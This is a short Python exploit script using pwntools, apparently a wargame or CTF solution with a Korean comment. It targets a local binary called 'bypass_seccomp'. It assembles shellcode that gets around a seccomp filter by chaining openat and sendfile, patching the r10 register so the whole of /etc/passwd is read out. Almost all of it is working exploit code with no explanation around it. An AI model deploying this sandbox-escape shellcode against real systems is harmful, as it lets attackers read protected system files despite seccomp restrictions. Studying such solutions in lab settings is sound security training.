#!/usr/bin/env python3
# Name: bypass_seccomp.py
from pwn import *
context.arch = 'x86_64'
p = process('./bypass_seccomp')
shellcode = shellcraft.openat(0, '/etc/passwd')
#shellcode += 'mov r10, 0xffff'
shellcode += shellcraft.sendfile(1, 'rax', 0).replace('xor r10d, r10d','mov r10, 0xffff') # openat 반환값 주소가 'rax' 레지스터에 저장되어 있음
shellcode += shellcraft.exit(0)
p.sendline(asm(shellcode))
p.interactive()